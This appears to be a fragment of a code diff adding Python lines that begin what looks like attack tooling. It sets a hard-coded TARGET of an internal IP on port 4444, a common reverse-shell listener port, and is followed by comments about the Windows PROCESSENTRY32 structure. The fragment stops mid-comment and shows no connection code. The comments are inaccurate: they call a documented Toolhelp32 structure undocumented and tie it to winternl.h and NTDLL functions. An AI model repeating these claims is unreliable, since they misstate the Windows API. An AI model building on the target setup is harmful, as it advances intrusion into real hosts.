import _struct
+import os
+
+TARGET = ('10.67.2.74', 4444)
+
+# If you're curious about windows structures,
+# For example, PROCESSENTRY32 is an undocumented struct used by NTDLL functions like NtYieldExecution
+# header <winternl.h>
+# typedef struct _PROCESSENTRY32 {
+#   DWORD     dwSize;
+#   DWORD     cntUsage;
+#   DWORD     th32ProcessID;
+#   ULONG_PTR th32DefaultHeapID;
+#   DWORD     th32ModuleID;
+#   DWORD     cntThreads;
+#   DWORD     th32ParentProcessID;
+#   LONG      pcPriClassBase;
+#   DWORD     dwFlags;
+#   TCHAR     szExeFile[MAX_PATH];
+# } PROCESSENTRY32, *PPROCESSENTRY32;
+
+# Unpack/Pack
+# Most instructions use packed data (i.e. instructions
